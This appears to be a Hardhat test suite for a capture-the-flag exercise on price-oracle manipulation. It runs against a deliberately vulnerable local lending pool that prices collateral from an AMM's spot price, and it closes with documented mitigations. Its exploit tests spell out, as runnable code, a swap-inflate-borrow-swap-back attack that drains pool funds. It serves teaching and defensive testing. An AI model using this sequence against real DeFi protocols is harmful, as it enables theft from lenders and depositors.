import { expect } from "chai";
import { ethers } from "hardhat";
import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";

/**
 * Oracle Manipulation CTF - Comprehensive Test Suite
 * 
 * This test file demonstrates and validates the oracle manipulation vulnerability.
 * It includes:
 * - Contract deployment and setup tests
 * - Normal operation validation
 * - Exploit proof-of-concept tests
 * - Edge case handling
 * - Profitability analysis
 */

describe("Oracle Manipulation CTF", function () {
  // ============ Fixture for consistent test setup ============
  async function deployOracleManipulationFixture() {
    const [owner, attacker, liquidityProvider, victim] = await ethers.getSigners();

    // Configuration
    const INITIAL_LIQUIDITY_TOKEN = ethers.parseEther("10000"); // 10,000 TOKEN
    const INITIAL_LIQUIDITY_USDC = ethers.parseEther("10000");  // 10,000 USDC
    const LENDING_POOL_USDC = ethers.parseEther("100000");      // 100,000 USDC

    // Deploy ERC20 tokens
    const ERC20Mock = await ethers.getContractFactory("ERC20Mock");
    const token = await ERC20Mock.deploy("Vulnerable Token", "VULN");
    const usdc = await ERC20Mock.deploy("USD Coin", "USDC");

    // Deploy AMM (DEX)
    const SimpleAMM = await ethers.getContractFactory("SimpleAMM");
    const amm = await SimpleAMM.deploy(await token.getAddress(), await usdc.getAddress());

    // Deploy Lending Pool (uses AMM as oracle)
    const LendingPool = await ethers.getContractFactory("LendingPool");
    const lendingPool = await LendingPool.deploy(
      await token.getAddress(),
      await usdc.getAddress(),
      await amm.getAddress()
    );

    // Setup liquidity
    await token.mint(liquidityProvider.address, INITIAL_LIQUIDITY_TOKEN);
    await usdc.mint(liquidityProvider.address, INITIAL_LIQUIDITY_USDC);
    await token.connect(liquidityProvider).approve(await amm.getAddress(), INITIAL_LIQUIDITY_TOKEN);
    await usdc.connect(liquidityProvider).approve(await amm.getAddress(), INITIAL_LIQUIDITY_USDC);
    await amm.connect(liquidityProvider).addLiquidity(INITIAL_LIQUIDITY_TOKEN, INITIAL_LIQUIDITY_USDC);

    // Fund lending pool
    await usdc.mint(await lendingPool.getAddress(), LENDING_POOL_USDC);

    return {
      token,
      usdc,
      amm,
      lendingPool,
      owner,
      attacker,
      liquidityProvider,
      victim,
      INITIAL_LIQUIDITY_TOKEN,
      INITIAL_LIQUIDITY_USDC,
      LENDING_POOL_USDC
    };
  }

  // ============ DEPLOYMENT TESTS ============
  describe("Contract Deployment", function () {
    it("Should deploy all contracts with correct parameters", async function () {
      const { token, usdc, amm, lendingPool } = await loadFixture(deployOracleManipulationFixture);

      expect(await token.name()).to.equal("Vulnerable Token");
      expect(await token.symbol()).to.equal("VULN");
      expect(await usdc.name()).to.equal("USD Coin");
      expect(await usdc.symbol()).to.equal("USDC");
      expect(await amm.token()).to.equal(await token.getAddress());
      expect(await amm.usdc()).to.equal(await usdc.getAddress());
      expect(await lendingPool.oracle()).to.equal(await amm.getAddress());
    });

    it("Should have correct initial liquidity in AMM", async function () {
      const { amm, INITIAL_LIQUIDITY_TOKEN, INITIAL_LIQUIDITY_USDC } = 
        await loadFixture(deployOracleManipulationFixture);

      expect(await amm.reserveToken()).to.equal(INITIAL_LIQUIDITY_TOKEN);
      expect(await amm.reserveUSDC()).to.equal(INITIAL_LIQUIDITY_USDC);
    });

    it("Should have initial spot price of 1 USDC per TOKEN", async function () {
      const { amm } = await loadFixture(deployOracleManipulationFixture);
      
      const spotPrice = await amm.getSpotPrice();
      expect(spotPrice).to.equal(ethers.parseEther("1"));
    });

    it("Should have funded lending pool with USDC", async function () {
      const { usdc, lendingPool, LENDING_POOL_USDC } = 
        await loadFixture(deployOracleManipulationFixture);

      const poolBalance = await usdc.balanceOf(await lendingPool.getAddress());
      expect(poolBalance).to.equal(LENDING_POOL_USDC);
    });
  });

  // ============ NORMAL OPERATIONS TESTS ============
  describe("Normal Operations", function () {
    it("Should allow collateral deposit", async function () {
      const { token, lendingPool, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      expect(await lendingPool.collateral(attacker.address)).to.equal(depositAmount);
    });

    it("Should allow borrowing within 80% LTV limit", async function () {
      const { token, usdc, lendingPool, attacker } = 
        await loadFixture(deployOracleManipulationFixture);
      
      // Deposit 100 TOKEN (worth 100 USDC at 1:1)
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      // Borrow exactly 80 USDC (80% LTV)
      const borrowAmount = ethers.parseEther("80");
      await lendingPool.connect(attacker).borrow(borrowAmount);

      expect(await lendingPool.debt(attacker.address)).to.equal(borrowAmount);
      expect(await usdc.balanceOf(attacker.address)).to.equal(borrowAmount);
    });

    it("Should reject borrowing above 80% LTV limit", async function () {
      const { token, lendingPool, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      // Try to borrow 81 USDC (above 80% LTV)
      const borrowAmount = ethers.parseEther("81");
      await expect(
        lendingPool.connect(attacker).borrow(borrowAmount)
      ).to.be.revertedWith("Too much borrow");
    });

    it("Should allow multiple deposits from same user", async function () {
      const { token, lendingPool, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const deposit1 = ethers.parseEther("50");
      const deposit2 = ethers.parseEther("75");
      
      await token.mint(attacker.address, deposit1 + deposit2);
      await token.connect(attacker).approve(await lendingPool.getAddress(), deposit1 + deposit2);
      
      await lendingPool.connect(attacker).depositCollateral(deposit1);
      await lendingPool.connect(attacker).depositCollateral(deposit2);

      expect(await lendingPool.collateral(attacker.address)).to.equal(deposit1 + deposit2);
    });

    it("Should allow partial borrowing", async function () {
      const { token, lendingPool, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      // Borrow in two parts
      await lendingPool.connect(attacker).borrow(ethers.parseEther("40"));
      await lendingPool.connect(attacker).borrow(ethers.parseEther("40"));

      expect(await lendingPool.debt(attacker.address)).to.equal(ethers.parseEther("80"));
    });
  });

  // ============ AMM MECHANICS TESTS ============
  describe("AMM Swap Mechanics", function () {
    it("Should increase spot price when buying TOKEN with USDC", async function () {
      const { usdc, amm, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const initialPrice = await amm.getSpotPrice();
      
      const swapAmount = ethers.parseEther("5000");
      await usdc.mint(attacker.address, swapAmount);
      await usdc.connect(attacker).approve(await amm.getAddress(), swapAmount);
      await amm.connect(attacker).swapUSDCForToken(swapAmount);

      const priceAfter = await amm.getSpotPrice();
      expect(priceAfter).to.be.gt(initialPrice);
    });

    it("Should decrease spot price when selling TOKEN for USDC", async function () {
      const { token, amm, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const initialPrice = await amm.getSpotPrice();
      
      const swapAmount = ethers.parseEther("3000");
      await token.mint(attacker.address, swapAmount);
      await token.connect(attacker).approve(await amm.getAddress(), swapAmount);
      await amm.connect(attacker).swapTokenForUSDC(swapAmount);

      const priceAfter = await amm.getSpotPrice();
      expect(priceAfter).to.be.lt(initialPrice);
    });

    it("Should maintain x*y=k constant product invariant (approximately)", async function () {
      const { usdc, amm, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      const reserveTokenBefore = await amm.reserveToken();
      const reserveUSDCBefore = await amm.reserveUSDC();
      const kBefore = reserveTokenBefore * reserveUSDCBefore;

      // Perform swap
      const swapAmount = ethers.parseEther("2000");
      await usdc.mint(attacker.address, swapAmount);
      await usdc.connect(attacker).approve(await amm.getAddress(), swapAmount);
      await amm.connect(attacker).swapUSDCForToken(swapAmount);

      const reserveTokenAfter = await amm.reserveToken();
      const reserveUSDCAfter = await amm.reserveUSDC();
      const kAfter = reserveTokenAfter * reserveUSDCAfter;

      // Due to integer division rounding, k may be slightly different
      // But it should remain within a small tolerance (0.01%)
      const kDiff = kBefore > kAfter ? kBefore - kAfter : kAfter - kBefore;
      const tolerance = kBefore / 10000n; // 0.01% tolerance
      expect(kDiff).to.be.lte(tolerance);
    });

    it("Should handle tiny swaps appropriately", async function () {
      const { usdc, amm, attacker } = await loadFixture(deployOracleManipulationFixture);
      
      // With 10000:10000 reserves, a 1 wei swap would produce:
      // k = 10000e18 * 10000e18 = 1e44
      // newReserveUSDC = 10000e18 + 1 = 10000000000000000000001
      // newReserveToken = k / newReserveUSDC ≈ 10000e18 - tiny_amount
      // The output would be approximately 0 due to integer division
      // But the AMM may or may not revert depending on precision
      
      // This test verifies the AMM handles tiny amounts without catastrophic failure
      const tinySwap = 1n; // 1 wei
      await usdc.mint(attacker.address, tinySwap);
      await usdc.connect(attacker).approve(await amm.getAddress(), tinySwap);
      
      // The swap should either revert with "No output" or complete with negligible output
      try {
        await amm.connect(attacker).swapUSDCForToken(tinySwap);
        // If it doesn't revert, verify token balance is still essentially 0
        const tokenBalance = await (await ethers.getContractFactory("ERC20Mock")).attach(await amm.token()).balanceOf(attacker.address);
        expect(tokenBalance).to.be.lte(1n); // Effectively 0 or 1 wei
      } catch (error: any) {
        // Expected to revert with "No output"
        expect(error.message).to.include("No output");
      }
    });
  });

  // ============ ORACLE MANIPULATION EXPLOIT TESTS ============
  describe("🔥 Oracle Manipulation Exploit", function () {
    it("Should allow attacker to borrow more than fair value through price manipulation", async function () {
      const { token, usdc, amm, lendingPool, attacker } = 
        await loadFixture(deployOracleManipulationFixture);

      // Attacker setup: 100 TOKEN for collateral, 9000 USDC for manipulation
      const attackerCollateral = ethers.parseEther("100");
      const attackerUSDC = ethers.parseEther("9000");

      await token.mint(attacker.address, attackerCollateral);
      await usdc.mint(attacker.address, attackerUSDC);

      // Step 1: Deposit collateral
      await token.connect(attacker).approve(await lendingPool.getAddress(), attackerCollateral);
      await lendingPool.connect(attacker).depositCollateral(attackerCollateral);

      // Record normal borrow power
      const initialPrice = await amm.getSpotPrice();
      const normalBorrowPower = (attackerCollateral * initialPrice * 80n) / (100n * ethers.parseEther("1"));

      // Step 2: Manipulate oracle by swapping USDC->TOKEN
      await usdc.connect(attacker).approve(await amm.getAddress(), attackerUSDC);
      await amm.connect(attacker).swapUSDCForToken(attackerUSDC);

      // Step 3: Borrow at inflated price
      const manipulatedPrice = await amm.getSpotPrice();
      const inflatedBorrowPower = (attackerCollateral * manipulatedPrice * 80n) / (100n * ethers.parseEther("1"));

      await lendingPool.connect(attacker).borrow(inflatedBorrowPower);

      // Verify exploit success
      expect(inflatedBorrowPower).to.be.gt(normalBorrowPower);
      expect(await lendingPool.debt(attacker.address)).to.equal(inflatedBorrowPower);
    });

    it("Should demonstrate full flash loan style atomic attack", async function () {
      const { token, usdc, amm, lendingPool, attacker } = 
        await loadFixture(deployOracleManipulationFixture);

      // Simulate flash loan scenario
      const flashLoanAmount = ethers.parseEther("50000");
      const collateralAmount = ethers.parseEther("1000");

      await token.mint(attacker.address, collateralAmount);
      await usdc.mint(attacker.address, flashLoanAmount);

      // Calculate normal borrow power before anything
      const normalPrice = await amm.getSpotPrice();
      const normalMaxBorrow = (collateralAmount * normalPrice * 80n) / (100n * ethers.parseEther("1"));

      // Atomic attack sequence:
      // 1. Deposit collateral
      await token.connect(attacker).approve(await lendingPool.getAddress(), collateralAmount);
      await lendingPool.connect(attacker).depositCollateral(collateralAmount);

      // 2. Manipulate price
      await usdc.connect(attacker).approve(await amm.getAddress(), flashLoanAmount);
      await amm.connect(attacker).swapUSDCForToken(flashLoanAmount);

      // 3. Borrow at inflated price
      const manipulatedPrice = await amm.getSpotPrice();
      const inflatedMaxBorrow = (collateralAmount * manipulatedPrice * 80n) / (100n * ethers.parseEther("1"));
      await lendingPool.connect(attacker).borrow(inflatedMaxBorrow);

      // 4. Swap back TOKEN->USDC
      const tokensHeld = await token.balanceOf(attacker.address);
      await token.connect(attacker).approve(await amm.getAddress(), tokensHeld);
      await amm.connect(attacker).swapTokenForUSDC(tokensHeld);

      // Verify attack succeeded
      const extraBorrowed = inflatedMaxBorrow - normalMaxBorrow;
      expect(extraBorrowed).to.be.gt(0);
      
      // The attacker borrowed more than their collateral's fair value allows
      expect(inflatedMaxBorrow).to.be.gt(normalMaxBorrow);
    });

    it("Should show attack profitability scales with manipulation size", async function () {
      const { usdc, amm } = await loadFixture(deployOracleManipulationFixture);

      const collateralAmount = ethers.parseEther("100");
      const normalPrice = await amm.getSpotPrice();
      const normalBorrow = (collateralAmount * normalPrice * 80n) / (100n * ethers.parseEther("1"));

      // Test different manipulation sizes
      const swapSizes = [
        ethers.parseEther("1000"),
        ethers.parseEther("3000"),
        ethers.parseEther("5000"),
        ethers.parseEther("9000")
      ];

      let previousExtra = 0n;
      
      for (const swapSize of swapSizes) {
        // Calculate price after swap (using constant product formula)
        const reserveToken = await amm.reserveToken();
        const reserveUSDC = await amm.reserveUSDC();
        const k = reserveToken * reserveUSDC;
        const newReserveUSDC = reserveUSDC + swapSize;
        const newReserveToken = k / newReserveUSDC;
        const priceAfter = (newReserveUSDC * ethers.parseEther("1")) / newReserveToken;

        const inflatedBorrow = (collateralAmount * priceAfter * 80n) / (100n * ethers.parseEther("1"));
        const extraBorrow = inflatedBorrow - normalBorrow;

        // Larger swaps should give more extra borrow power
        expect(extraBorrow).to.be.gt(previousExtra);
        previousExtra = extraBorrow;
      }
    });

    it("Should allow attacker to drain significant pool funds", async function () {
      const { token, usdc, amm, lendingPool, attacker, LENDING_POOL_USDC } = 
        await loadFixture(deployOracleManipulationFixture);

      // Large scale attack
      const attackerCollateral = ethers.parseEther("5000");
      const manipulationFunds = ethers.parseEther("90000");

      await token.mint(attacker.address, attackerCollateral);
      await usdc.mint(attacker.address, manipulationFunds);

      // Execute attack
      await token.connect(attacker).approve(await lendingPool.getAddress(), attackerCollateral);
      await lendingPool.connect(attacker).depositCollateral(attackerCollateral);

      await usdc.connect(attacker).approve(await amm.getAddress(), manipulationFunds);
      await amm.connect(attacker).swapUSDCForToken(manipulationFunds);

      const manipulatedPrice = await amm.getSpotPrice();
      const maxBorrow = (attackerCollateral * manipulatedPrice * 80n) / (100n * ethers.parseEther("1"));
      
      // Borrow as much as possible (up to pool limit)
      const poolBalance = await usdc.balanceOf(await lendingPool.getAddress());
      const actualBorrow = maxBorrow < poolBalance ? maxBorrow : poolBalance;
      await lendingPool.connect(attacker).borrow(actualBorrow);

      // Verify significant amount was borrowed
      const debt = await lendingPool.debt(attacker.address);
      expect(debt).to.be.gt(ethers.parseEther("4000")); // Normal would be 4000 USDC
    });
  });

  // ============ EDGE CASES AND SECURITY TESTS ============
  describe("Edge Cases and Security", function () {
    it("Should revert if trying to borrow with no collateral", async function () {
      const { lendingPool, attacker } = await loadFixture(deployOracleManipulationFixture);

      await expect(
        lendingPool.connect(attacker).borrow(ethers.parseEther("1"))
      ).to.be.revertedWith("Too much borrow");
    });

    it("Should handle multiple users correctly", async function () {
      const { token, usdc, lendingPool, attacker, victim } = 
        await loadFixture(deployOracleManipulationFixture);

      // Both users deposit
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.mint(victim.address, depositAmount);

      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await token.connect(victim).approve(await lendingPool.getAddress(), depositAmount);

      await lendingPool.connect(attacker).depositCollateral(depositAmount);
      await lendingPool.connect(victim).depositCollateral(depositAmount);

      // Both users borrow
      await lendingPool.connect(attacker).borrow(ethers.parseEther("40"));
      await lendingPool.connect(victim).borrow(ethers.parseEther("60"));

      expect(await lendingPool.debt(attacker.address)).to.equal(ethers.parseEther("40"));
      expect(await lendingPool.debt(victim.address)).to.equal(ethers.parseEther("60"));
    });

    it("Should correctly calculate LTV with different prices", async function () {
      const { token, usdc, amm, lendingPool, attacker, liquidityProvider } = 
        await loadFixture(deployOracleManipulationFixture);

      // Change the price by adding asymmetric liquidity
      // First buy some tokens to shift the price
      const buyAmount = ethers.parseEther("5000");
      await usdc.mint(liquidityProvider.address, buyAmount);
      await usdc.connect(liquidityProvider).approve(await amm.getAddress(), buyAmount);
      await amm.connect(liquidityProvider).swapUSDCForToken(buyAmount);

      const newPrice = await amm.getSpotPrice();
      expect(newPrice).to.be.gt(ethers.parseEther("1")); // Price increased

      // Now test LTV calculation at new price
      const depositAmount = ethers.parseEther("100");
      await token.mint(attacker.address, depositAmount);
      await token.connect(attacker).approve(await lendingPool.getAddress(), depositAmount);
      await lendingPool.connect(attacker).depositCollateral(depositAmount);

      // Calculate expected max borrow
      const expectedMaxBorrow = (depositAmount * newPrice * 80n) / (100n * ethers.parseEther("1"));
      
      // Should be able to borrow up to max
      await lendingPool.connect(attacker).borrow(expectedMaxBorrow);
      expect(await lendingPool.debt(attacker.address)).to.equal(expectedMaxBorrow);
    });

    it("Should revert getSpotPrice with no liquidity", async function () {
      const { token, usdc } = await loadFixture(deployOracleManipulationFixture);

      // Deploy fresh AMM without liquidity
      const SimpleAMM = await ethers.getContractFactory("SimpleAMM");
      const emptyAmm = await SimpleAMM.deploy(await token.getAddress(), await usdc.getAddress());

      await expect(emptyAmm.getSpotPrice()).to.be.revertedWith("No liquidity");
    });
  });

  // ============ PROFITABILITY ANALYSIS ============
  describe("Profitability Analysis", function () {
    it("Should calculate net profit/loss including slippage", async function () {
      const { token, usdc, amm, lendingPool, attacker } = 
        await loadFixture(deployOracleManipulationFixture);

      const attackerCollateral = ethers.parseEther("100");
      const attackerUSDC = ethers.parseEther("9000");

      await token.mint(attacker.address, attackerCollateral);
      await usdc.mint(attacker.address, attackerUSDC);

      const initialUSDCBalance = await usdc.balanceOf(attacker.address);

      // Execute full attack cycle
      await token.connect(attacker).approve(await lendingPool.getAddress(), attackerCollateral);
      await lendingPool.connect(attacker).depositCollateral(attackerCollateral);

      await usdc.connect(attacker).approve(await amm.getAddress(), attackerUSDC);
      await amm.connect(attacker).swapUSDCForToken(attackerUSDC);

      const manipulatedPrice = await amm.getSpotPrice();
      const borrowAmount = (attackerCollateral * manipulatedPrice * 80n) / (100n * ethers.parseEther("1"));
      await lendingPool.connect(attacker).borrow(borrowAmount);

      const tokensHeld = await token.balanceOf(attacker.address);
      await token.connect(attacker).approve(await amm.getAddress(), tokensHeld);
      await amm.connect(attacker).swapTokenForUSDC(tokensHeld);

      const finalUSDCBalance = await usdc.balanceOf(attacker.address);
      const netChange = finalUSDCBalance - initialUSDCBalance;

      // The borrowed amount should offset slippage losses
      // In this scenario, net change includes borrowed USDC
      expect(finalUSDCBalance).to.be.gt(0);
    });
  });

  // ============ DOCUMENTATION TESTS ============
  describe("Vulnerability Documentation", function () {
    it("Should document the attack vector", function () {
      /**
       * ORACLE MANIPULATION ATTACK VECTOR:
       * 
       * 1. Attacker deposits collateral (TOKEN) to LendingPool
       * 2. Attacker performs large swap USDC->TOKEN on AMM
       * 3. This increases the spot price (reserveUSDC / reserveToken)
       * 4. LendingPool reads inflated price from AMM
       * 5. Attacker can borrow more USDC than collateral is truly worth
       * 6. Attacker swaps TOKEN back to USDC (reverses price)
       * 7. Attacker walks away with excess borrowed USDC
       * 
       * ROOT CAUSE: Using AMM spot price as oracle without TWAP or external validation
       */
      expect(true).to.be.true;
    });

    it("Should document recommended mitigations", function () {
      const mitigations = [
        "Use TWAP (Time-Weighted Average Price) instead of spot price",
        "Integrate Chainlink or Pyth price oracles",
        "Implement borrowing delays between deposit and borrow",
        "Use multiple oracle sources and check for deviation",
        "Add circuit breakers for rapid price movements",
        "Verify AMM K-value hasn't changed drastically"
      ];

      expect(mitigations.length).to.be.gte(5);
    });
  });
});
